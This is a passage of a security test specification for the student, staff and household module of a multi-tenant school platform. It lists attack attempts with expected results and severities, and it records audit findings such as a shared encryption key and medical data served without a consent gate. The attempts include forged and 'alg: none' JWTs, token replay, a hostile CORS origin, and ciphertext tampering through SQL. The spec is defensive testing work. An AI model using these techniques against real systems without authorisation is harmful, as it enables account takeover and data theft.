| #    | Attempt                                                                                                                              | Expected                                                    | Severity | Pass/Fail |
| ---- | ------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------- | -------- | --------- |
| 5.1  | Expired JWT → any People endpoint.                                                                                                   | 401.                                                        | P0       |           |
| 5.2  | Forged JWT (different secret).                                                                                                       | 401.                                                        | P0       |           |
| 5.3  | Tampered JWT payload (change `sub` to another user).                                                                                 | 401 signature mismatch.                                     | P0       |           |
| 5.4  | JWT with `alg: none` (algorithm-confusion attack).                                                                                   | 401.                                                        | P0       |           |
| 5.5  | JWT with `alg: HS256` but sent as `RS256` (or vice versa).                                                                           | 401.                                                        | P0       |           |
| 5.6  | JWT from Tenant A used with Tenant B's subdomain (`https://acme-test.edupod.app/api/v1/students`).                                   | 401 or 403 — the subdomain-to-tenant mapping should reject. | P0       |           |
| 5.7  | Refresh token replay after rotation.                                                                                                 | 401.                                                        | P1       |           |
| 5.8  | Concurrent sessions: user has 3 active devices, revokes 1 via a "sign out of all" flow. Other 2 still work.                          | As designed.                                                | P2       |           |
| 5.9  | Brute-force login: 100 attempts.                                                                                                     | Rate-limited or account-locked after N.                     | P1       |           |
| 5.10 | Password reset flow — N/A here (covered in auth spec).                                                                               | —                                                           | —        |           |
| 5.11 | Staff-initial-password-never-rotated: log in with initial staff_number as password. Force-change flow should trigger on first login. | Force change.                                               | P1       |           |

---

## 6. CSRF + CORS

| #   | Attempt                                                                                                                                                                                                         | Expected                   | Severity | Pass/Fail |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------- | -------- | --------- |
| 6.1 | The API uses Bearer JWTs (no cookies). CSRF is mitigated by this — a cross-origin request cannot include the Bearer header (the browser would not attach it). Confirm no cookie-based session exists alongside. | Bearer-only.               | P1       |           |
| 6.2 | CORS allowlist is strict: `Origin: https://evil.example.com` to an API endpoint — preflight `OPTIONS` returns no `Access-Control-Allow-Origin`.                                                                 | Blocked.                   | P1       |           |
| 6.3 | CORS allowlist is tenant-aware — only the tenant's configured subdomain is allowed, not `*.edupod.app`.                                                                                                         | Confirm via server config. | P1       |           |
| 6.4 | `credentials: include` CORS requests — only succeed from allowlisted origins with specific allowlisted headers.                                                                                                 | Correct.                   | P1       |           |

---

## 7. Encrypted-field access control

Repeat the integration spec §11 here with a security-mindset framing:

| #   | Attempt                                                                                                                                               | Expected                                                                                                                                                                                                                                                                                                                                                                                        | Severity | Pass/Fail |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 7.1 | Read raw bank ciphertext via `$queryRawUnsafe` from a service that does NOT decrypt.                                                                  | Ciphertext only. No decryption bypass.                                                                                                                                                                                                                                                                                                                                                          | P0       |           |
| 7.2 | Tamper with ciphertext in DB (`UPDATE staff_profiles SET bank_account_number_encrypted = '...'`). Decrypt.                                            | AES-GCM authentication fails → decrypt throws.                                                                                                                                                                                                                                                                                                                                                  | P0       |           |
| 7.3 | Replay ciphertext from Tenant A to Tenant B's row. Decrypt as B.                                                                                      | Fails — the encryption key is tenant-global (per the code's `encryptionService.encrypt` which uses a single secret ref). If the key were tenant-scoped, cross-tenant replay would fail. Confirm current behaviour and flag **S-7-1** if key is shared across tenants (it is — which means a tenant A admin could theoretically decrypt tenant B bank data if they somehow read the ciphertext). | P1       |           |
| 7.4 | Sidechannel: a bank number shows up in an error response stack trace after a crash during encryption.                                                 | Plaintext never in errors.                                                                                                                                                                                                                                                                                                                                                                      | P0       |           |
| 7.5 | Response shape: `bank_account_number_masked` is `****1234` — an attacker learns the last-4. Acceptable for operational use.                           | As designed.                                                                                                                                                                                                                                                                                                                                                                                    | P2       |           |
| 7.6 | Log review: grep for plaintext bank.                                                                                                                  | Clean.                                                                                                                                                                                                                                                                                                                                                                                          | P0       |           |
| 7.7 | Audit log entries on bank reads contain `classification='financial'`.                                                                                 | Correct.                                                                                                                                                                                                                                                                                                                                                                                        | P1       |           |
| 7.8 | Key rotation: the current EncryptionService supports `keyRef` per row, so partial re-encryption is possible. Confirm a rotation script is documented. | Flag if missing.                                                                                                                                                                                                                                                                                                                                                                                | P2       |           |

---

## 8. Audit-log integrity

| #   | Attempt                                                                                                                                                                                                                                                                                                 | Expected                                                                                                                                                 | Severity | Pass/Fail |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 8.1 | PATCH / DELETE on `/v1/audit-logs/*`.                                                                                                                                                                                                                                                                   | 404 (no such endpoint).                                                                                                                                  | P1       |           |
| 8.2 | SQL `UPDATE audit_logs SET ...` from the application role.                                                                                                                                                                                                                                              | Revoked at the DB level (grant should be `SELECT, INSERT` only). Confirm via `SELECT has_table_privilege('<app_role>', 'audit_logs', 'UPDATE')` = false. | P1       |           |
| 8.3 | Audit-log row contains: actor_user_id, tenant_id, entity_type, entity_id, action, before, after (redacted where applicable), timestamp, request_id.                                                                                                                                                     | Present.                                                                                                                                                 | P1       |           |
| 8.4 | Before/after for encrypted fields: ciphertext only (NO plaintext).                                                                                                                                                                                                                                      | Correct.                                                                                                                                                 | P0       |           |
| 8.5 | Before/after for password fields on staff create: NO plaintext password.                                                                                                                                                                                                                                | Correct.                                                                                                                                                 | P0       |           |
| 8.6 | Audit retention: the module doesn't delete audit rows; retention is managed by a cross-module compliance job. The compliance job uses a retention policy per entity class. Verify retention doesn't delete audit rows before the regulatory minimum (usually 7 years for financial records, 3 for PII). | Policy documented.                                                                                                                                       | P2       |           |

---

## 9. Sensitive-data exposure review (responses + logs)

### 9.1 Response shape review

Manually inspect each endpoint's response for PII that the requester doesn't need.

| #     | Response                                                                                                               | Check                                                                                                                                                                               | Severity | Pass/Fail |
| ----- | ---------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 9.1.1 | GET /v1/students (list) — does it include `medical_notes`, `allergy_details`, `national_id`?                           | `medical_notes` + `allergy_details`: YES (via the full select). `national_id`: YES. Consider whether list views need these — possibly not. Flag **S-9-1** to strip non-list fields. | P2       |           |
| 9.1.2 | GET /v1/students/:id — includes parent email + phone. Teachers see this (see T5 in teacher spec).                      | Intentional for guardians context, but broad.                                                                                                                                       | P3       |           |
| 9.1.3 | GET /v1/staff-profiles (list) — includes user email + phone. Teachers do NOT access this endpoint. Admin access only.  | Acceptable.                                                                                                                                                                         | P3       |           |
| 9.1.4 | GET /v1/staff-profiles/:id — does NOT include encrypted bank fields (only `_last4: null or "****"`).                   | Correct.                                                                                                                                                                            | P0       |           |
| 9.1.5 | GET /v1/parents/:id — includes email + phone + whatsapp. Restricted to admin + teacher.                                | Acceptable.                                                                                                                                                                         | P3       |           |
| 9.1.6 | GET /v1/households/:id — includes full address, billing_parent email/phone, emergency_contacts name+phone. Admin-only. | Acceptable.                                                                                                                                                                         | P3       |           |
| 9.1.7 | Internal IDs: responses use UUIDs everywhere — no sequential integer IDs.                                              | Correct.                                                                                                                                                                            | P2       |           |
| 9.1.8 | 5xx responses: confirm no stack trace, DB error message, or file path in the body.                                     | Clean.                                                                                                                                                                              | P1       |           |

### 9.2 Log review

| #     | Check                                                                                      | Expected      | Severity | Pass/Fail |
| ----- | ------------------------------------------------------------------------------------------ | ------------- | -------- | --------- |
| 9.2.1 | Grep API logs for known bank number, national_id, email, phone.                            | Zero matches. | P0       |           |
| 9.2.2 | Grep worker logs for the same.                                                             | Zero matches. | P0       |           |
| 9.2.3 | JWT or refresh tokens in logs.                                                             | Never.        | P0       |           |
| 9.2.4 | Password hashes in logs.                                                                   | Never.        | P0       |           |
| 9.2.5 | Stack traces: present in server logs (for debugging), but NOT in client-visible responses. | Correct.      | P1       |           |

---

## 10. Rate limiting

| #    | Attempt                                                                                                             | Expected                                                                            | Severity | Pass/Fail |
| ---- | ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | -------- | --------- |
| 10.1 | 1000 requests per minute to `GET /v1/students` from a single IP + single user.                                      | 429 after the per-user budget. Default NestJS ThrottlerGuard budget, tenant-scoped. | P1       |           |
| 10.2 | 100 failed login attempts.                                                                                          | Rate-limit + account lock.                                                          | P1       |           |
| 10.3 | 1000 requests per minute across different endpoints.                                                                | Shared rate-limit OR per-endpoint — test actual behaviour.                          | P2       |           |
| 10.4 | One tenant floods at 500 req/s. Another tenant's latency unchanged (no noisy-neighbor). Verified in perf spec §9.4. | Isolated.                                                                           | P2       |           |
| 10.5 | Export endpoint (`/students/export-data`) rate-limited tighter than reads (it's expensive).                         | Tighter limit.                                                                      | P2       |           |
| 10.6 | PDF render — N/A for People.                                                                                        | —                                                                                   | —        |           |

---

## 11. Security headers

Inspect every HTML + API response. Test with `curl -I`.

| #     | Header                                                                                     | Expected value                                                                                            | Severity | Pass/Fail |
| ----- | ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 11.1  | `Content-Security-Policy`                                                                  | `default-src 'self'; script-src 'self' 'nonce-...'; ...` — no `*`, no `unsafe-inline` (except via nonce). | P1       |           |
| 11.2  | `Strict-Transport-Security`                                                                | `max-age=31536000; includeSubDomains; preload`                                                            | P1       |           |
| 11.3  | `X-Frame-Options`                                                                          | `DENY` (or CSP `frame-ancestors 'none'`)                                                                  | P1       |           |
| 11.4  | `X-Content-Type-Options`                                                                   | `nosniff`                                                                                                 | P2       |           |
| 11.5  | `Referrer-Policy`                                                                          | `strict-origin-when-cross-origin` or tighter                                                              | P2       |           |
| 11.6  | `Permissions-Policy`                                                                       | explicit allowlist                                                                                        | P2       |           |
| 11.7  | `X-DNS-Prefetch-Control`                                                                   | `off`                                                                                                     | P3       |           |
| 11.8  | Cache-Control for authenticated responses                                                  | `no-store, no-cache, must-revalidate`                                                                     | P2       |           |
| 11.9  | `Server` header removed (no `X-Powered-By: Express/Nest`).                                 | Absent.                                                                                                   | P3       |           |
| 11.10 | CORS preflight: `Access-Control-Allow-Origin` echoes only the allowlisted origin, not `*`. | Correct.                                                                                                  | P1       |           |

---

## 12. Dependency audit

| #    | Workspace                                            | Command             | Expected       | Pass/Fail |
| ---- | ---------------------------------------------------- | ------------------- | -------------- | --------- |
| 12.1 | `apps/api`                                           | `pnpm audit --prod` | Zero critical. |           |
| 12.2 | `apps/web`                                           | `pnpm audit --prod` | Zero critical. |           |
| 12.3 | `apps/worker`                                        | `pnpm audit --prod` | Zero critical. |           |
| 12.4 | `packages/shared`                                    | `pnpm audit --prod` | Zero critical. |           |
| 12.5 | `packages/ui`                                        | `pnpm audit --prod` | Zero critical. |           |
| 12.6 | `packages/prisma`                                    | `pnpm audit --prod` | Zero critical. |           |
| 12.7 | High-severity CVEs with mitigation notes documented. | Documented.         |                |

Key packages to monitor:

- `bcryptjs`, `jsonwebtoken` / `jose` — auth primitives
- `zod` — validation
- `@prisma/client` — DB
- `bullmq` — queues
- `ioredis` — Redis client
- `jspdf`, `xlsx` — export
- `@nestjs/*` — framework

---

## 13. Business logic abuse

| #     | Attempt                                                                                                                                                                                                                                                    | Expected                                                                                                                                                                                                                                                             | Severity | Pass/Fail |
| ----- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------- |
| 13.1  | Merge source = target → 400 `SAME_HOUSEHOLD`.                                                                                                                                                                                                              | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.2  | Merge with archived source → 400.                                                                                                                                                                                                                          | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.3  | Merge that causes orphaned invoices (the source has open invoices; they stay on the archived source). Is this acceptable? — see INT-6 in integration spec. Confirm the finance module handles archived-household billing correctly.                        | Cross-module concern.                                                                                                                                                                                                                                                | P2       |           |
| 13.4  | Status-skipping: applicant → graduated.                                                                                                                                                                                                                    | 400.                                                                                                                                                                                                                                                                 | P2       |           |
| 13.5  | Status regression: graduated → active.                                                                                                                                                                                                                     | 400.                                                                                                                                                                                                                                                                 | P2       |           |
| 13.6  | Archived household resurrection via `/status` endpoint.                                                                                                                                                                                                    | 200 (not state-machine-gated; see INT-4 / S-A4-1). Flag as P2 for design review.                                                                                                                                                                                     | P2       |           |
| 13.7  | Unlink the billing parent → 400 `IS_BILLING_PARENT`.                                                                                                                                                                                                       | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.8  | Remove the last emergency contact → 400 `MIN_CONTACTS_REQUIRED`.                                                                                                                                                                                           | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.9  | Create 4 emergency contacts → 400 `CONTACTS_LIMIT_REACHED`.                                                                                                                                                                                                | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.10 | Add same parent to a household twice → idempotent (existing record returned, no duplicate row).                                                                                                                                                            | Correct.                                                                                                                                                                                                                                                             | P2       |           |
| 13.11 | Merge race: two parallel merges on same source → exactly one succeeds. (Covered in integration §9.1.)                                                                                                                                                      | Correct.                                                                                                                                                                                                                                                             | P1       |           |
| 13.12 | Allergy-report consent bypass: can you retrieve allergy data for a student whose consent is withdrawn? Attempt by crafting a query that avoids the consent filter (e.g. a different endpoint).                                                             | Only the allergy-report endpoint is consent-gated; the student detail endpoint shows medical data for any student. **This is a consent leakage** — flag **S-13-1** (P1): if a student's medical data is consent-gated in one surface, it should be gated everywhere. | P1       |           |
| 13.13 | Enumerate students via the list endpoint (Tenant A admin, page through all) — do any rows leak from Tenant B?                                                                                                                                              | Zero leakage. (Verified by integration spec §2.1.)                                                                                                                                                                                                                   | P0       |           |
| 13.14 | Teacher creates a new staff by accident (endpoint is blocked by permission). Confirm.                                                                                                                                                                      | 403.                                                                                                                                                                                                                                                                 | P1       |           |
| 13.15 | Split creates a "phantom" household (0 students, 0 parents). Is this a DoS vector? — multiple successful phantom splits could clutter the household list with empty records. Design fix: require at least 1 student OR 1 parent selected. Flag **S-13-2**. | P3                                                                                                                                                                                                                                                                   |          |
| 13.16 | Withdraw a student with a long reason (5000 chars) — Zod `.max(500)` rejects.                                                                                                                                                                              | 400.                                                                                                                                                                                                                                                                 | P2       |           |
| 13.17 | Excessive parent_links on student create (100 entries). Each validates independently → slow. Consider max-array constraint.                                                                                                                                | Missing? Flag **S-13-3**.                                                                                                                                                                                                                                            | P3       |           |

---

## 14. Summary severity tally + sign-off

### Findings from the walkthrough

| ID     | Severity | Category       | Description                                                                                                                                                                                        | File:line                            |
| ------ | -------- | -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------ |
| S-A2-1 | P1       | A02 Crypto     | Confirm first-login password rotation is enforced for new staff whose initial password = staff_number.                                                                                             | auth module                          |
| S-A4-1 | P2       | A04 Design     | Household status has no state machine — archived → active is permitted. Consider adding a `VALID_HOUSEHOLD_TRANSITIONS` map similar to students.                                                   | `households-crud.service.ts:320-344` |
| S-A8-1 | P1       | A08 Integrity  | Verify DB role does not have UPDATE / DELETE privilege on `audit_logs`.                                                                                                                            | DB grants                            |
| S-A9-1 | P2       | A09 Logging    | Cross-tenant access attempts (A reads B's student) should be logged as a security event, not just a vanilla 404.                                                                                   | Audit interceptor                    |
| S-7-1  | P1       | Crypto         | Encryption key is tenant-global (shared). If a tenant's admin can read another tenant's ciphertext (shouldn't happen via RLS, but defense-in-depth), they could decrypt. Consider per-tenant keys. | `EncryptionService`                  |
| S-FZ-1 | P2       | Injection      | Unicode null bytes in free-text may break downstream CSV/PDF export. Sanitise or reject.                                                                                                           | Export utilities                     |
| S-FZ-2 | P3       | Injection      | Homoglyphs in names/numbers are stored as-is — search / display may be confusing.                                                                                                                  | All string fields                    |
| S-9-1  | P2       | Data exposure  | Student list endpoint returns `medical_notes`, `allergy_details`, `national_id` in every row. Strip to detail-only?                                                                                | `students.service.ts:296-314`        |
| S-13-1 | P1       | Business logic | Student detail exposes medical data without consent gate; the allergy-report gate is only on the report endpoint. Consent-gate at the entity level.                                                | `students.service.ts:319-371`        |
| S-13-2 | P3       | Business logic | Split permits empty households — enable a `.refine` rejecting `student_ids.length === 0 && parent_ids.length === 0`.                                                                               | `splitHouseholdSchema`               |
| S-13-3 | P3       | Business logic | `parent_links` has no max length — consider `.max(10)` to prevent abuse.                                                                                                                           | `createStudentSchema`                |

### Severity tally

| Severity | Count (from findings above)       |
| -------- | --------------------------------- |
| P0       | 0                                 |
| P1       | 4 (S-A2-1, S-A8-1, S-7-1, S-13-1) |
| P2       | 4 (S-A4-1, S-A9-1, S-FZ-1, S-9-1) |
| P3       | 3 (S-FZ-2, S-13-2, S-13-3)        |

**Zero P0** findings — no immediate exploit paths identified during the audit. The 4 P1 findings warrant resolution or explicit acceptance before tenant onboarding.

### Sign-off

| Section                    | Reviewer | Date | Pass | Fail | Notes |
| -------------------------- | -------- | ---- | ---- | ---- | ----- |
| 1. Prerequisites           |          |      |      |      |       |
| 2. OWASP Top 10            |          |      |      |      |       |
| 3. Permission matrix       |          |      |      |      |       |
| 4. Injection fuzz          |          |      |      |      |       |
| 5. Authentication          |          |      |      |      |       |
| 6. CSRF + CORS             |          |      |      |      |       |
| 7. Encrypted fields        |          |      |      |      |       |
| 8. Audit log               |          |      |      |      |       |
| 9. Sensitive data exposure |          |      |      |      |       |
| 10. Rate limiting          |          |      |      |      |       |
| 11. Security headers       |          |      |      |      |       |
| 12. Dependency audit       |          |      |      |      |       |
| 13. Business logic abuse   |          |      |      |      |       |

**Release-ready when:**

- Every P0 row is Pass, AND
- All P1 findings either resolved or explicitly accepted with documented mitigation, AND
- Zero cells in the permission matrix are Fail, AND
- The dependency audit produces zero critical CVEs.

**Paid-consultant check:** after every row passes, a consultant spending a week on this module should find nothing new to report. If they do, add their findings to the spec and re-run.

---

**End of Security Spec.**
